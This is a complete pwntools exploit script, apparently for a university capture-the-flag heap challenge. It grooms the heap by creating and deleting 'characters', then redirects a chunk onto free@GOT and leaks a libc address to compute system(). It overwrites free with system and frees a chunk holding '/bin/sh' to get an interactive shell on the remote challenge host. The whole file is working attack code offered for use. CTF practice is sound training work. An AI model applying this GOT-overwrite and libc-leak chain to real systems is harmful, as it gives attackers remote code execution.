#!/usr/bin/env python3

from pwn import *

e = ELF("./bin_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = e


def createChar(r, numbChar, power):
    r.sendline(b"1")
    r.sendline(numbChar)
    r.sendline(power)

def showCharacters(r):
    r.sendline(b"4")

def deleteCharacter(r, numbChar):
    r.sendline(b"5")
    r.sendline(numbChar)

def changeTitles(r, numbChar, title):
    r.sendline(b"2")
    r.sendline(numbChar)
    r.send(title.ljust(59, b"\x00"))

def changePower(r, numbChar, power):
    r.sendline(b"3")
    r.sendline(numbChar)
    r.sendline(power)


def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            # b *delete_character
            # b *delete_character+118
            # b *delete_character+182
            # b *show_characters
            # b *change_power
            b * create
            b * get_flag
            c
            c
            c
            c

            c
            """)
    elif cond == 3:
        r = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10301)

    return r


def main():
    r = conn(3)

    # ---------------------------------------------------
    # stack massage
    createChar(r, b"1", b"1")
    createChar(r, b"2", b"2")
    createChar(r, b"3", b"3")
    createChar(r, b"4", b"4")

    deleteCharacter(r, b"1")
    deleteCharacter(r, b"2")
    deleteCharacter(r, b"3")
    # ---------------------------------------------------
    # Put one character with the info as a chunck of "free.got"
    changePower(r, b"3", str(e.got["free"]).encode())
    showCharacters(r)

    createChar(r, b"1", b"1")
    createChar(r, b"1", b"A") # this A will not change the value of the address of free@got

    # ---------------------------------------------------
    # Leak Libc

    showCharacters(r)

    r.recvuntil(b"DAENERYS  ").decode()
    r.recvuntil(b"DAENERYS  ").decode()
    r.recvuntil(b"power: ").decode()
    freeLibc = int(r.recvline().strip())
    print("Leak Libc:", hex(freeLibc))

    libc.address = freeLibc - libc.symbols["free"]

    print("Libc Base:", hex(libc.address))
    print("System:", hex(libc.symbols["system"]))

    # ---------------------------------------------------
    # Call system

    changeTitles(r, b"4", b"/bin/sh\x00")
    changePower(r, b"1", str(libc.symbols["system"]).encode())
    deleteCharacter(r, b"4")

    r.interactive()

if __name__ == "__main__":
    main()
